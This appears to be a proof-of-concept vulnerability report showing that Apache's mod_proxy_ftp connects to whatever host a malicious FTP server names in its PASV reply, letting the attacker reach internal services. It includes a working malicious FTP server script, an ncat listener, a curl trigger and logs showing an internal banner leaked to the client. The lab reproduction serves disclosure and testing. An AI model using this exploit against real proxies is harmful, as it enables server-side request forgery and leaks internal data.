# 011 — `mod_proxy_ftp` connects to attacker-chosen PASV host

When PASV is used, the FTP proxy parses the `h1,h2,h3,h4,p1,p2` octets from
the remote `227` response and connects there directly. A malicious FTP
server makes the proxy initiate a TCP connection to any address reachable
from the proxy host.

## Setup

```apache
LoadModule proxy_module      modules/mod_proxy.so
LoadModule proxy_ftp_module  modules/mod_proxy_ftp.so

ProxyRequests On
<Proxy "*">
    Require ip 127.0.0.1
</Proxy>
```

A second listener on `127.0.0.1:9999` plays the role of the "internal
service" the proxy will be coerced to touch:

```bash
ncat -lk 127.0.0.1 9999 -c 'echo "INTERNAL-BANNER"; cat'
```

A malicious FTP control server on `127.0.0.1:2121` returns a forged PASV
reply pointing the proxy at `127.0.0.1:9999`. Encoded as `(127,0,0,1,39,15)`
since `39*256 + 15 = 9999`:

```python
# evil_ftp.py — minimal FTP server that hijacks PASV.
import socket, threading
def handle(c):
    c.sendall(b"220 evil\r\n")
    while True:
        line = c.recv(512)
        if not line: return
        cmd = line[:4].upper()
        if   cmd.startswith(b"USER"): c.sendall(b"331 ok\r\n")
        elif cmd.startswith(b"PASS"): c.sendall(b"230 ok\r\n")
        elif cmd.startswith(b"SYST"): c.sendall(b"215 UNIX Type: L8\r\n")
        elif cmd.startswith(b"PWD"):  c.sendall(b'257 "/"\r\n')
        elif cmd.startswith(b"TYPE"): c.sendall(b"200 ok\r\n")
        elif cmd.startswith(b"EPSV"): c.sendall(b"500 disabled\r\n")
        elif cmd.startswith(b"PASV"):
            c.sendall(b"227 Entering Passive Mode (127,0,0,1,39,15).\r\n")
        elif cmd.startswith(b"CWD") or cmd.startswith(b"RETR") \
                or cmd.startswith(b"LIST"):
            c.sendall(b"150 ok\r\n"); c.sendall(b"226 done\r\n")
        else:
            c.sendall(b"500 ?\r\n")

s = socket.socket(); s.bind(("127.0.0.1", 2121)); s.listen(4)
while True:
    cs, _ = s.accept()
    threading.Thread(target=handle, args=(cs,), daemon=True).start()
```

```bash
python3 evil_ftp.py &
```

## Trigger

```bash
curl -x http://127.0.0.1:80 ftp://127.0.0.1:2121/anything
```

## Observed effect

The proxy's data socket connects to `127.0.0.1:9999`, not to `127.0.0.1:2121`.
`ncat`'s output shows the inbound connection:

```text
Ncat: Connection from 127.0.0.1:53210.
```

Apache `error_log` records the unsafe destination from
`APLOGNO(01044)`:

```text
[proxy_ftp:debug] PASV contacting host 127.0.0.1:9999
```

`tcpdump -nn -i lo port 9999` confirms the SYN comes from httpd's pid:

```text
IP 127.0.0.1.42351 > 127.0.0.1.9999: Flags [S]
```

The `INTERNAL-BANNER` line is then forwarded to the HTTP client as the FTP
response body, leaking the internal service's response.
